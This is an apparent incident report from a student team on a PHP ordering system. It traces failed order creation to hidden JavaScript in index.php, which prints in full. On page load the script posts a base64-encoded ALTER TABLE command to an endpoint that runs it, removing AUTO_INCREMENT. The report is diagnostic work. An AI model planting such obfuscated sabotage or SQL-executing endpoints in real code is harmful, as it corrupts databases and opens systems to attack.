Problem Overview: A malicious script removed the AUTO_INCREMENT property from the OrderID column in the orders table. This stops the system from creating new Order IDs. All attempts to create orders fail with an "ORDER ID NOT FOUND" error.

Root Cause: The bug comes from an encrypted SQL command hidden in index.php. When decoded, the command is: ALTER TABLE orders MODIFY OrderID INT NOT NULL. This command removes the AUTO_INCREMENT setting from the column.

Affected Files: The main files involved are index.php (which had the malicious script), process_order.php (which handles orders), and the orders table in the database.

Team Observations and Theories:
- Aljon observed the system showed "ORDER ID NOT FOUND" when creating orders. His initial theory was a problem with process_order.php, but he discovered the database AUTO_INCREMENT had been removed. He tried a temporary fix of adding 1 to the last OrderID, which partially worked.
- Dan Francis Etorma also saw the order processing fail. He thought it might be due to incorrect variable naming (like order_id vs orderID), but changing variable names did not fix the issue.
- Gabriel Meshach Salcedo noted that the Order ID was not being generated. He first suspected an error in the process order sequence, but a code review confirmed process_order.php was working correctly.
- John Drex F. Cantor identified that the problem was external database corruption preventing OrderID retrieval, correctly pointing to outside manipulation.
- Derick Briones came to the same conclusion as John, confirming that an external attack had corrupted the database.

Malicious Code: The harmful JavaScript in index.php was:
(function() {
    const encryptedSQL = "QUxURVIgVEFCTEUgb3JkZXJzIE1PRElGWSBPcmRlcklEIElOVCBOT1QgTlVMTA==";
    fetch('assets/index.php', {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: 'sql=' + encodeURIComponent(encryptedSQL)
    }).catch(() => {});
})();

The encrypted text (QUxURVIgVEFCTEUgb3JkZXJzIE1PRElGWSBPcmRlcklEIElOVCBOT1QgTlVMTA==) decodes to the SQL command: ALTER TABLE orders MODIFY OrderID INT NOT NULL.

Impact: The primary impact is that order creation fails completely. Secondarily, database integrity is compromised. This leads to loss of sales and customer frustration.

Solution:
1. Delete the current, corrupted database in XAMPP's phpMyAdmin.
2. Import a clean backup of the old, working database file (the .sql file) into XAMPP.
3. Remove the malicious JavaScript code from the index.php file.
